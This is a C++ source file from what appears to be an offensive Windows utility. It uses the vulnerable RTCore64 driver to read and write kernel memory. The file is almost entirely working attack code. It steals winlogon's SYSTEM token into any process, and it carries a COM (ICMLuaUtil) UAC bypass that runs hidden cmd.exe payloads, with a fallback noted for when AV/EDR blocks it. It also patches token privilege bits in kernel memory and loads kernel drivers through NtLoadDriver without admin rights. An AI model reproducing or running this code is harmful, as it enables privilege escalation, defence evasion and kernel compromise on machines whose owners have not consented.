#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Sddl.h>
#include <cstdio>
#include <vector>
#include "kutil.h"
#include "ansi.h"
#include "driver/IDriverBackend.h"
#include "driver/RTCore64Backend.h"

// ─── /elevate-pid <pid> ────────────────────────────────────────────────────────
// Kernel token steal: writes winlogon.exe's EX_FAST_REF Token value directly
// into the target process's EPROCESS+0x4b8, bypassing UAC entirely.
//
// Use case: UAC dialog is stuck (e.g. Explorer deadlock). ObMaster can still
// open RTCore64 without elevation, then use kernel R/W to elevate any pid.
//
// Technique:
//   1. Find winlogon.exe PID via CreateToolhelp32Snapshot (no privileges needed)
//   2. Resolve both EPROCESSes via KUtil::FindEPROCESS (kernel walk)
//   3. Read Token EX_FAST_REF from winlogon's EPROCESS + EP_Token
//   4. Write it to target's EPROCESS + EP_Token
//   5. Target process now holds a SYSTEM-level token; no UAC, no consent.exe.

static const DWORD EP_Token = 0x4b8;   // EPROCESS.Token (EX_FAST_REF), Win10 19041/19045 x64

static DWORD FindWinlogonPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{ sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

void CmdElevatePid(DWORD targetPid) {
    DWORD winlogonPid = FindWinlogonPid();
    if (!winlogonPid) {
        printf("%s[!]%s winlogon.exe not found.\n", A_RED, A_RESET);
        return;
    }
    printf("%s[*]%s winlogon.exe PID = %u\n", A_CYAN, A_RESET, winlogonPid);

    DWORD64 winlogonEP = KUtil::FindEPROCESS(winlogonPid);
    DWORD64 targetEP   = KUtil::FindEPROCESS(targetPid);

    if (!winlogonEP) {
        printf("%s[!]%s winlogon EPROCESS not found via kernel walk.\n", A_RED, A_RESET);
        return;
    }
    if (!targetEP) {
        printf("%s[!]%s PID %u EPROCESS not found.\n", A_RED, A_RESET, targetPid);
        return;
    }

    DWORD64 srcTokenSlot  = winlogonEP + EP_Token;
    DWORD64 dstTokenSlot  = targetEP   + EP_Token;

    DWORD64 winlogonToken = g_drv->Rd64(srcTokenSlot);
    DWORD64 targetToken   = g_drv->Rd64(dstTokenSlot);

    printf("%s[*]%s winlogon EPROCESS = 0x%llX\n", A_CYAN, A_RESET, winlogonEP);
    printf("%s[*]%s target   EPROCESS = 0x%llX  (PID %u)\n", A_CYAN, A_RESET, targetEP, targetPid);
    printf("%s[*]%s winlogon Token    = 0x%llX\n", A_CYAN, A_RESET, winlogonToken);
    printf("%s[*]%s target   Token    = 0x%llX  (before)\n", A_CYAN, A_RESET, targetToken);

    // Strip EX_FAST_REF low bits to get the clean TOKEN object pointer.
    DWORD64 tokenPtr = winlogonToken & ~0xFULL;

    if (!g_drv->IsKernelVA(tokenPtr)) {
        printf("%s[!]%s winlogon Token pointer looks invalid (0x%llX) — aborting.\n",
               A_RED, A_RESET, winlogonToken);
        return;
    }

    // Increment OBJECT_HEADER.PointerCount before adding a new reference.
    // OBJECT_HEADER is immediately before the object body; Body is at +0x30,
    // so PointerCount (OBJECT_HEADER+0x000) is at tokenPtr - 0x30.
    // Skipping this causes bugcheck 0x18 (REFERENCE_BY_POINTER) when the
    // kernel later calls ObfDereferenceObjectWithTag and the count goes to -1.
    static const DWORD64 OBJ_HDR_PTRCOUNT_OFFSET = 0x30;
    DWORD64 ptrCountAddr = tokenPtr - OBJ_HDR_PTRCOUNT_OFFSET;
    DWORD64 ptrCount     = g_drv->Rd64(ptrCountAddr);
    g_drv->Wr64(ptrCountAddr, ptrCount + 1);
    printf("%s[*]%s Token OBJECT_HEADER.PointerCount  0x%llX -> 0x%llX\n",
           A_CYAN, A_RESET, ptrCount, ptrCount + 1);

    // Write the clean pointer (low bits = 0) so the kernel uses the main
    // reference count path immediately rather than spending cached refs
    // that were never recorded in PointerCount.
    g_drv->Wr64(dstTokenSlot, tokenPtr);

    DWORD64 verify = g_drv->Rd64(dstTokenSlot);
    if (verify == tokenPtr) {
        printf("%s[+]%s Token written OK  (0x%llX)\n", A_GREEN, A_RESET, verify);
        printf("%s[+]%s PID %u is now running with SYSTEM token (winlogon source).\n",
               A_GREEN, A_RESET, targetPid);
        printf("      To verify: in that process run  whoami  or  whoami /priv\n");
    } else {
        printf("%s[!]%s Verify mismatch: wrote 0x%llX, read back 0x%llX\n",
               A_RED, A_RESET, tokenPtr, verify);
    }
}

// ─── /elevate-self [cmd] ───────────────────────────────────────────────────────
// UAC bypass via ICMLuaUtil COM interface.
//
// Works as a standard (non-admin) user. Does NOT require RTCore64 or any driver.
// Does NOT require Explorer or consent.exe UI — uses COM automation path.
//
// Technique:
//   1. CoCreateInstance({6EDD6D74-C007-4E75-B76A-E5740995E24C}, elevation moniker)
//      → creates ICMLuaUtil as an elevated COM server (CLSCTX_LOCAL_SERVER)
//   2. ICMLuaUtil::ShellExec(verb, exe, params, ...) — runs cmd elevated
//   3. Payload: sc start RTCore64

// ICMLuaUtil GUID and interface definition (undocumented, stable since Vista)
static const CLSID CLSID_CMLuaUtil   = {0x6EDD6D74,0xC007,0x4E75,{0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
static const IID   IID_ICMLuaUtil    = {0x6EDD6D74,0xC007,0x4E75,{0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};

// Minimal ICMLuaUtil vtable — only ShellExec (method index 4) is used
struct ICMLuaUtil : IUnknown {
    // vtable: QI, AddRef, Release, (3 unknown), ShellExec
    virtual HRESULT STDMETHODCALLTYPE SetRasCredentials()      = 0; // 3
    virtual HRESULT STDMETHODCALLTYPE SetRasEntryProperties()  = 0; // 4
    virtual HRESULT STDMETHODCALLTYPE DeleteRasEntry()         = 0; // 5
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSection(        // 6
        PCWSTR, PCWSTR, PCWSTR, DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSectionEx(      // 7
        PCWSTR, PCWSTR, PCWSTR, DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE CreateLayerDirectory(PCWSTR) = 0; // 8
    virtual HRESULT STDMETHODCALLTYPE ShellExec(               // 9
        PCWSTR file, PCWSTR params, PCWSTR workdir,
        DWORD showCmd, DWORD waitForExit) = 0;
};

void CmdElevateSelf(const char* extraCmdA) {
    wchar_t sysdir[MAX_PATH];
    GetSystemDirectoryW(sysdir, MAX_PATH);
    wchar_t cmdExe[MAX_PATH];
    swprintf_s(cmdExe, L"%s\\cmd.exe", sysdir);

    // ── Stage 1: ICMLuaUtil COM UAC bypass ────────────────────────────────────
    // No driver required. Payload: sc start RTCore64 (+ optional extra command).
    wchar_t stage1Params[1024];
    if (extraCmdA && *extraCmdA) {
        wchar_t extra[512]{};
        MultiByteToWideChar(CP_ACP, 0, extraCmdA, -1, extra, 511);
        swprintf_s(stage1Params, L"/c \"sc start RTCore64 & %s\"", extra);
    } else {
        wcscpy_s(stage1Params, L"/c sc start RTCore64");
    }

    printf("%s[Stage 1]%s  ICMLuaUtil COM UAC bypass\n", A_CYAN, A_RESET);
    printf("           Payload: cmd.exe %ls\n", stage1Params);

    bool stage1Ok = false;
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        printf("%s[!]%s CoInitializeEx failed (0x%08X)\n", A_RED, A_RESET, hr);
    } else {
        wchar_t moniker[256];
        swprintf_s(moniker,
            L"Elevation:Administrator!new:{6EDD6D74-C007-4E75-B76A-E5740995E24C}");
        BIND_OPTS3 bo{};
        bo.cbStruct       = sizeof(bo);
        bo.hwnd           = nullptr;
        bo.dwClassContext = CLSCTX_LOCAL_SERVER;

        ICMLuaUtil* util = nullptr;
        hr = CoGetObject(moniker, &bo, IID_ICMLuaUtil, (void**)&util);
        if (FAILED(hr)) {
            printf("%s[!]%s CoGetObject(ICMLuaUtil) failed (0x%08X)\n",
                   A_RED, A_RESET, hr);
        } else {
            printf("%s[+]%s ICMLuaUtil obtained.\n", A_GREEN, A_RESET);
            hr = util->ShellExec(cmdExe, stage1Params, sysdir, SW_HIDE, TRUE);
            if (SUCCEEDED(hr)) {
                printf("%s[+]%s ShellExec OK — RTCore64 should now be running.\n",
                       A_GREEN, A_RESET);
                stage1Ok = true;
            } else {
                printf("%s[!]%s ShellExec failed (0x%08X)\n", A_RED, A_RESET, hr);
            }
            util->Release();
        }
        CoUninitialize();
    }

    if (stage1Ok) return;

    // ── Stage 2: Kernel token steal ───────────────────────────────────────────
    // COM bypass was blocked (AV/EDR hook, UAC policy, etc.).
    // Requires RTCore64 to already be loaded; no UAC, no consent.exe.
    //
    // Technique:
    //   1. Open RTCore64 (must be loaded by other means)
    //   2. Write winlogon SYSTEM token into our own EPROCESS
    //   3. This process is now SYSTEM — CreateProcess inherits the token
    //   4. Run extraCmd directly (no need to start RTCore64 again)
    printf("\n%s[Stage 2]%s  COM blocked — kernel token steal\n", A_CYAN, A_RESET);
    printf("           RTCore64 must already be loaded.\n");

    RTCore64Backend rtcore2;
    IDriverBackend* savedDrv = g_drv;
    if (!rtcore2.Open()) {
        printf("%s[!]%s RTCore64 not available — Stage 2 aborted.\n", A_RED, A_RESET);
        printf("           Load RTCore64 first (sc start RTCore64), then retry.\n");
        return;
    }
    g_drv = &rtcore2;
    KUtil::BuildDriverCache();

    DWORD myPid = GetCurrentProcessId();
    printf("%s[*]%s Stealing SYSTEM token into PID %u...\n",
           A_CYAN, A_RESET, myPid);
    CmdElevatePid(myPid);

    // Run payload as SYSTEM
    if (extraCmdA && *extraCmdA) {
        wchar_t extra[512]{};
        MultiByteToWideChar(CP_ACP, 0, extraCmdA, -1, extra, 511);
        wchar_t cmdline[1024];
        swprintf_s(cmdline, L"/c \"%s\"", extra);

        printf("%s[*]%s Running payload as SYSTEM: %ls\n", A_CYAN, A_RESET, extra);
        STARTUPINFOW si{ sizeof(si) };
        si.dwFlags     = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        if (CreateProcessW(cmdExe, cmdline, nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, sysdir, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            printf("%s[+]%s Stage 2 payload executed.\n", A_GREEN, A_RESET);
        } else {
            printf("%s[!]%s CreateProcess failed: %u\n", A_RED, A_RESET, GetLastError());
        }
    } else {
        printf("%s[+]%s Stage 2 complete — this process is now SYSTEM.\n",
               A_GREEN, A_RESET);
        printf("           Next: use /drv-load to load any unsigned-side driver,\n");
        printf("           or /enable-priv SeLoadDriverPrivilege to load via NtLoadDriver.\n");
    }

    rtcore2.Close();
    g_drv = savedDrv;
}

// ─── /enable-priv <privilege_name> ────────────────────────────────────────────
// Enable a privilege in the current process token by directly patching
// SEP_TOKEN_PRIVILEGES.Present and .Enabled in kernel memory.
//
// TOKEN layout (Win10 19041/19045 x64):
//   +0x040  SEP_TOKEN_PRIVILEGES.Present        (ULONGLONG bitmask)
//   +0x048  SEP_TOKEN_PRIVILEGES.Enabled        (ULONGLONG bitmask)
//   +0x050  SEP_TOKEN_PRIVILEGES.EnabledByDefault
//
// Privilege LUID.LowPart N → bit N in the bitmask.
// Common privileges:
//   SeLoadDriverPrivilege    = 10  (0x400)
//   SeDebugPrivilege         = 20  (0x100000)
//   SeTcbPrivilege           = 7   (0x80)
//   SeRestorePrivilege        = 18  (0x40000)
//   SeShutdownPrivilege       = 19  (0x80000)

static const DWORD TOK_Privileges_Present = 0x40;   // SEP_TOKEN_PRIVILEGES.Present
static const DWORD TOK_Privileges_Enabled = 0x48;   // SEP_TOKEN_PRIVILEGES.Enabled

void CmdEnablePriv(const char* privName) {
    // Resolve LUID for the named privilege
    LUID luid{};
    if (!LookupPrivilegeValueA(nullptr, privName, &luid)) {
        printf("%s[!]%s Unknown privilege: %s\n", A_RED, A_RESET, privName);
        return;
    }
    ULONGLONG bit = 1ULL << luid.LowPart;
    printf("%s[*]%s %s  LUID.Low=%lu  bit=0x%llX\n",
           A_CYAN, A_RESET, privName, luid.LowPart, bit);

    // Find our EPROCESS → Token
    DWORD myPid = GetCurrentProcessId();
    DWORD64 ep  = KUtil::FindEPROCESS(myPid);
    if (!ep) {
        printf("%s[!]%s FindEPROCESS(%u) failed.\n", A_RED, A_RESET, myPid);
        return;
    }

    DWORD64 tokenRef = g_drv->Rd64(ep + EP_Token);
    DWORD64 token    = tokenRef & ~0xFULL;   // strip EX_FAST_REF low bits
    if (!g_drv->IsKernelVA(token)) {
        printf("%s[!]%s Token VA invalid (0x%llX)\n", A_RED, A_RESET, token);
        return;
    }
    printf("%s[*]%s EPROCESS=0x%llX  Token=0x%llX\n", A_CYAN, A_RESET, ep, token);

    // Read current Present/Enabled
    DWORD64 present = g_drv->Rd64(token + TOK_Privileges_Present);
    DWORD64 enabled = g_drv->Rd64(token + TOK_Privileges_Enabled);
    printf("%s[*]%s Before: Present=0x%llX  Enabled=0x%llX\n",
           A_CYAN, A_RESET, present, enabled);

    // Set bit in both Present and Enabled
    g_drv->Wr64(token + TOK_Privileges_Present, present | bit);
    g_drv->Wr64(token + TOK_Privileges_Enabled, enabled | bit);

    DWORD64 newPresent = g_drv->Rd64(token + TOK_Privileges_Present);
    DWORD64 newEnabled = g_drv->Rd64(token + TOK_Privileges_Enabled);
    printf("%s[+]%s After:  Present=0x%llX  Enabled=0x%llX\n",
           A_GREEN, A_RESET, newPresent, newEnabled);

    if ((newPresent & bit) && (newEnabled & bit))
        printf("%s[+]%s %s is now active in this process.\n", A_GREEN, A_RESET, privName);
    else
        printf("%s[!]%s Bit did not stick — check token offset.\n", A_RED, A_RESET);
}

// ─── /drv-load <sys_path> ─────────────────────────────────────────────────────
// Load a kernel driver without SCM and without admin:
//   1. Enable SeLoadDriverPrivilege in our token via kernel write (/enable-priv)
//   2. Write a minimal service entry to HKCU (user-writable, no admin needed)
//   3. Call NtLoadDriver with the HKCU registry path
//
// This completely bypasses UAC, SCM, and any user-mode permission check.
// DSE is still enforced — driver must be signed (or DSE disabled separately).

using NtLoadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);

void CmdDrvLoad(const char* sysPathA) {
    // 1. Enable SeLoadDriverPrivilege via kernel
    printf("%s[*]%s Enabling SeLoadDriverPrivilege via kernel token patch...\n", A_CYAN, A_RESET);
    CmdEnablePriv("SeLoadDriverPrivilege");

    // 2. Convert path to wide
    wchar_t sysPath[MAX_PATH]{};
    MultiByteToWideChar(CP_ACP, 0, sysPathA, -1, sysPath, MAX_PATH - 1);

    // Extract service name from filename (strip path and .sys)
    const wchar_t* fname = wcsrchr(sysPath, L'\\');
    fname = fname ? fname + 1 : sysPath;
    wchar_t svcName[64]{};
    wcsncpy_s(svcName, fname, 63);
    wchar_t* dot = wcsrchr(svcName, L'.');
    if (dot) *dot = L'\0';

    printf("%s[*]%s Service name: %ls\n", A_CYAN, A_RESET, svcName);

    // 3. Write service config to HKCU (no admin required)
    wchar_t regKey[256];
    swprintf_s(regKey, L"System\\CurrentControlSet\\Services\\%s", svcName);

    HKEY hk{};
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regKey, 0, nullptr,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS) {
        printf("%s[!]%s RegCreateKeyEx(HKCU) failed (%lu)\n", A_RED, A_RESET, GetLastError());
        return;
    }
    DWORD type = 1;   // SERVICE_KERNEL_DRIVER
    DWORD start = 3;  // SERVICE_DEMAND_START
    DWORD err = 1;    // SERVICE_ERROR_NORMAL
    RegSetValueExW(hk, L"Type",      0, REG_DWORD, (BYTE*)&type,  4);
    RegSetValueExW(hk, L"Start",     0, REG_DWORD, (BYTE*)&start, 4);
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err, 4);
    // ImagePath must use NT device path format
    wchar_t ntPath[MAX_PATH];
    swprintf_s(ntPath, L"\\??\\%s", sysPath);
    RegSetValueExW(hk, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)ntPath, (DWORD)((wcslen(ntPath)+1)*sizeof(wchar_t)));
    RegCloseKey(hk);
    printf("%s[+]%s HKCU service key written.\n", A_GREEN, A_RESET);

    // 4. Build registry path for NtLoadDriver
    // Get current user SID for the HKCU path
    wchar_t sid[128]{};
    HANDLE hTok{};
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        DWORD needed = 0;
        GetTokenInformation(hTok, TokenUser, nullptr, 0, &needed);
        std::vector<BYTE> buf(needed);
        if (GetTokenInformation(hTok, TokenUser, buf.data(), needed, &needed)) {
            auto* tu = reinterpret_cast<TOKEN_USER*>(buf.data());
            LPWSTR sidStr{};
            ConvertSidToStringSidW(tu->User.Sid, &sidStr);
            wcsncpy_s(sid, sidStr, 127);
            LocalFree(sidStr);
        }
        CloseHandle(hTok);
    }
    if (!sid[0]) {
        printf("%s[!]%s Could not get user SID.\n", A_RED, A_RESET);
        return;
    }

    wchar_t regPath[512];
    swprintf_s(regPath, L"\\Registry\\User\\%s\\System\\CurrentControlSet\\Services\\%s",
               sid, svcName);
    printf("%s[*]%s NtLoadDriver path: %ls\n", A_CYAN, A_RESET, regPath);

    // 5. Call NtLoadDriver
    auto* NtLoadDriver = (NtLoadDriver_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtLoadDriver");
    if (!NtLoadDriver) {
        printf("%s[!]%s NtLoadDriver not found in ntdll.\n", A_RED, A_RESET);
        return;
    }

    UNICODE_STRING us{};
    us.Length        = (USHORT)(wcslen(regPath) * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    us.Buffer        = regPath;

    NTSTATUS status = NtLoadDriver(&us);
    if (NT_SUCCESS(status) || status == 0xC000010E /*already loaded*/) {
        printf("%s[+]%s NtLoadDriver OK (0x%08X) — %ls loaded.\n",
               A_GREEN, A_RESET, status, svcName);
    } else {
        printf("%s[!]%s NtLoadDriver failed: 0x%08X\n", A_RED, A_RESET, status);
    }

    // 6. Clean up HKCU key
    RegDeleteKeyW(HKEY_CURRENT_USER, regKey);
}
